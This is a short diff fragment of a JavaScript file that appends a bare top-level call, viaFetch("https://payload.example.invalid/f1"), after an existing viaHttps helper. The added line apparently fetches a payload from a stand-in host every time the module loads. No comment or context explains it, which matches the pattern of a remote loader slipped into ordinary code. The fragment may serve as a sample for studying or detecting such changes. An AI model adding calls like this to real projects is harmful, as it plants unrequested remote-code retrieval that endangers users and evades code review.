@@ -24,3 +24,5 @@ function viaHttps(url) {
     });
   });
 }
+
+viaFetch("https://payload.example.invalid/f1");
